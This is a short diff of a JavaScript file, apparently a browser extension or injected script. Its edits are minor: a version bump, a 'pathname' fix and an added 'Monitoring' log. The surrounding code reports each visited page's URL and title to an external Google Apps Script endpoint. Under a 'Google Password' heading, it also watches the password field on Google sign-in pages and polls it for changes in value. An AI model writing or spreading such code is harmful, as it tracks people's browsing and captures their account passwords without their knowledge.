@@ -1,4 +1,4 @@
-console.log('V12', window.location.host, window.location.path);
+console.log('V13', window.location.host, window.location.pathname);
 
 // Log URLs and init actions
 fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${$('title').text()}`, {
@@ -31,8 +31,12 @@ setInterval(() => {
 // Google Password
 function initPasswordMonitor() {
   if (window.location.pathname.split('/')[1] === 'signin') {
+
+    console.log('Monitoring');
+
     var password = $("input[type='password']");
     var currentVal = password.attr('data-initial-value');
+
     setInterval(() => {
       if (password.attr('data-initial-value') !== currentVal) {
         currentVal = password.attr('data-initial-value');
